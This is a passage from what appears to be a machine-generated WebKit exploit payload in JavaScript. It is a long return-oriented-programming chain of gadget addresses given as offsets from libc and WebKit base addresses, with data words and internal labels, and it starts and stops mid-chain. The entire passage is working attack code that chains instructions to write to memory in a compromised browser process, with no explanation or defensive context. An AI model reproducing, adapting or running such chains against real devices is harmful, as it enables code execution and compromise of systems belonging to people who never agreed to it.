libc_base+793877 //pop rsi
]);
//L635:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L636:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+90648, //L637
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90664, //L639
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L637:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L639:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90808, //L642
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90776, //L640
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90792, //L641
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90880, //L643
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L643:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90936, //L646
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L646:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91016, //L647
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L647:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L648:
db([7, 0]); // 0x7
set_gadget(libc_base+792472,); //pop rcx
//L649:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+91120, //L650
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+91136, //L651
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+91224, //L652
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L652:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91280, //L655
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L655:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91352, //L656
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L656:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91408, //L659
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L659:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91512, //L662
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L661:
db([40, 0]); // 0x28
set_gadget(libc_base+792472,); //pop rcx
//L662:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91600, //L663
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91616, //L665
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L663:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L665:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91760, //L668
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91728, //L666
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91744, //L667
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+91856, //L671
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L670:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L671:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91944, //L672
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91960, //L674
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L672:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92104, //L677
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92072, //L675
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92088, //L676
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92176, //L678
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L678:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92232, //L681
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L681:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92312, //L682
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L682:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L683:
db([8, 0]); // 0x8
set_gadget(libc_base+792472,); //pop rcx
//L684:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+92416, //L685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+92432, //L686
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+92520, //L687
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92576, //L690
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L690:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92648, //L691
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L691:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92704, //L694
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L694:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L695:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92856, //L698
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L697:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L698:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+92944, //L699
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92960, //L701
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L699:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L701:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93104, //L704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93072, //L702
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93088, //L703
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93176, //L705
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L705:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+93232, //L708
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L708:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93312, //L709
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L709:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L710:
db([9, 0]); // 0x9
set_gadget(libc_base+792472,); //pop rcx
//L711:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+93416, //L712
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+93432, //L713
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+93520, //L714
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93576, //L717
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L717:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93648, //L718
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L718:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93704, //L721
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L721:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93808, //L724
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L723:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+93896, //L725
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93912, //L727
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L725:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L727:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94056, //L730
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94024, //L728
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94040, //L729
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L728:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94128, //L731
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L731:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94184, //L734
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L734:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94264, //L735
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L735:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L736:
db([6, 0]); // 0x6
set_gadget(libc_base+792472,); //pop rcx
//L737:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+94368, //L738
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+94384, //L739
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L738:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+94472, //L740
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L740:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94528, //L743
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L743:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94648, //L746
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L745:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L746:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+94736, //L747
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94752, //L749
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L747:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L749:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94896, //L752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94864, //L750
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94880, //L751
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L750:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94968, //L753
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L753:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95024, //L756
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L756:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95104, //L757
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L757:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L758:
db([10, 0]); // 0xa
set_gadget(libc_base+792472,); //pop rcx
//L759:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+95208, //L760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+95224, //L761
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+95312, //L762
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L762:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95368, //L765
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L765:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95440, //L766
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L766:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95496, //L769
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L769:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L770:
webkit_base+14461559, //mov [rax], rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95648, //L773
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L772:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+95736, //L774
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95752, //L776
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95896, //L779
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95864, //L777
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95880, //L778
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95968, //L780
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L780:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96024, //L783
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L783:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96104, //L784
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L784:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L785:
db([11, 0]); // 0xb
set_gadget(libc_base+792472,); //pop rcx
//L786:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+96208, //L787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+96224, //L788
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+96312, //L789
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L789:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96368, //L792
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L792:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96440, //L793
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L793:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96496, //L796
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L796:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L797:
libc_base+272260, //mov rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96648, //L800
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L799:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+96736, //L801
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96752, //L803
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L801:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
